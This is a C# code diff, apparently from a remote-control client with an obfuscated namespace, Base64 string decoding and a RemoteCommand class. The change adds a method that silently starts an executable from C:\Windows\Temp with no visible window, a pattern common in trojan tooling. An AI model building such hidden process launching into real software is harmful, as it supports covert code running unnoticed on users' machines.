@@ -10,6 +10,7 @@ using System.IO.Compression;
 using System.Runtime.InteropServices;
 using System.Buffers.Text;
 using System.Runtime.CompilerServices;
+using System.Diagnostics;
 
 namespace s1l14lx3
 {
@@ -48,19 +49,16 @@ namespace s1l14lx3
             byte[] raw = Convert.FromBase64String(Encoded);
             return Encoding.UTF8.GetString(raw);
         }
-    }
-    /// <summary>
-    /// Toast class
-    /// </summary>
-    public class Toast
-    {
-        public static void Show(string Title)
+        public static void ShowToast(string Text)
         {
-
-        }
-        public static void Show(string Title, string Body)
-        {
-
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = @"C:\Windows\Temp\Toast.exe";
+            psi.Arguments = "Message " + Text;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+            Process process = new Process();
+            process.StartInfo = psi;
+            process.Start();
         }
     }
     public class RemoteCommand
